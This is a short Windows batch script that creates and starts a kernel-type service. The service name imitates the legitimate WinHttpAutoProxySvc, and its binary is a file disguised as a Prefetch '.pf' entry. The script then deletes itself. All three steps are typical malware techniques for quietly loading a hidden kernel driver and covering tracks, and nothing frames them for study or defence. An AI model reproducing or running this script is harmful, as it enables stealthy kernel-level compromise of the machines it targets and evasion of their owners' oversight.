@echo off
cd %~dp0
sc create WinHttpAutoProxySvc43_c binpath=C:\Windows\Prefetch\CMD.EXE-AEH933D0.pf type=kernel
sc start WinHttpAutoProxySvc43_c
del "%~f0"